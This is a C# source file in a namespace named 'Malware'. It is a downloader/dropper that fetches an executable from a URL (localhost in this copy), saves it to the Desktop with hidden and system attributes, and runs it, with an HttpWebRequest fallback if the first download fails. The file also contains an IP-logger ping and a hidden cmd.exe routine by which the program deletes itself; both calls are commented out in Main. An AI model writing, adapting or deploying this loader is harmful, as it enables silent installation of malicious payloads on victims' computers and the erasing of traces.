using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Malware
{
    internal class Program
    {
        private static bool IPLogger_action(string url)
        {
            try
            {
                using (WebClient webClient = new WebClient())
                using (webClient.OpenRead(url))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        private static void DownloadFile(string download_url, string save_path)
        {
            Console.WriteLine($"Attempting download: {download_url} -> {save_path}");

            try
            {
                // Ensure destination directory exists
                string destDir = Path.GetDirectoryName(save_path) ?? Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                if (!Directory.Exists(destDir))
                    Directory.CreateDirectory(destDir);

                // If file exists, try to remove it first (avoids locked/hidden file issues)
                if (File.Exists(save_path))
                {
                    try
                    {
                        // Remove read-only attributes if present
                        File.SetAttributes(save_path, FileAttributes.Normal);
                        File.Delete(save_path);
                        Console.WriteLine("Deleted existing file at destination.");
                    }
                    catch (Exception delEx)
                    {
                        Console.WriteLine("Warning: could not delete existing file: " + delEx.Message);
                        // continue and let the download attempt overwrite or fail
                    }
                }

                // Try WebClient first (no proxy) for simplicity
                using (var client = new WebClient())
                {
                    client.Proxy = null; // avoid proxy interference for local testing
                    client.DownloadFile(download_url, save_path);
                }

                Console.WriteLine("Download succeeded with WebClient.");
                Console.WriteLine("Saved file location: " + save_path);

                // Optionally set file attributes 
                try
                {
                    File.SetAttributes(save_path, FileAttributes.Hidden | FileAttributes.System);
                }
                catch (Exception attrEx)
                {
                    Console.WriteLine("Could not set attributes: " + attrEx.Message);
                }

                // Attempt to start the downloaded file
                try
                {
                    Console.WriteLine("Starting downloaded file...");
                    Process.Start(new ProcessStartInfo { FileName = save_path, UseShellExecute = true });
                }
                catch (Exception startEx)
                {
                    Console.WriteLine("Failed to start the downloaded file: " + startEx.Message);
                }
            }
            catch (Exception exWebClient)
            {
                Console.WriteLine("WebClient failed: " + exWebClient.GetType().Name + " - " + exWebClient.Message);
                Console.WriteLine("Trying HttpWebRequest fallback...");

                // fallback: HttpWebRequest + manual file write (overwrite)
                try
                {
                    var req = (HttpWebRequest)WebRequest.Create(download_url);
                    req.Proxy = null;
                    using (var resp = (HttpWebResponse)req.GetResponse())
                    using (var stream = resp.GetResponseStream())
                    using (var fs = new FileStream(save_path, FileMode.Create, FileAccess.Write))
                    {
                        stream.CopyTo(fs);
                    }

                    Console.WriteLine("Download succeeded with HttpWebRequest fallback.");
                    Console.WriteLine("Saved file location: " + save_path);

                    try
                    {
                        File.SetAttributes(save_path, FileAttributes.Hidden | FileAttributes.System);
                    }
                    catch (Exception attrEx2)
                    {
                        Console.WriteLine("Could not set attributes: " + attrEx2.Message);
                    }

                    try
                    {
                        Process.Start(new ProcessStartInfo { FileName = save_path, UseShellExecute = true });
                    }
                    catch (Exception startEx2)
                    {
                        Console.WriteLine("Failed to start the downloaded file: " + startEx2.Message);
                    }
                }
                catch (Exception exFallback)
                {
                    Console.WriteLine("Fallback failed: " + exFallback.GetType().Name + " - " + exFallback.Message);
                    Console.WriteLine("Ensure the server is running, the URL is correct, and no AV is quarantining the file.");
                }
            }
        }

        private static void SelfDelete()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" +
                                new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).FullName + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            catch { }
        }

        static void Main()
        {
            // IPLogger_action("Your IPLogger"); 
            string savePath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                "test.exe");
            DownloadFile("http://127.0.0.1:8000/test.exe", savePath);
            // SelfDelete(); 
            Console.WriteLine("Finished. Press Enter to exit.");
            Console.ReadLine();
        }
    }
}
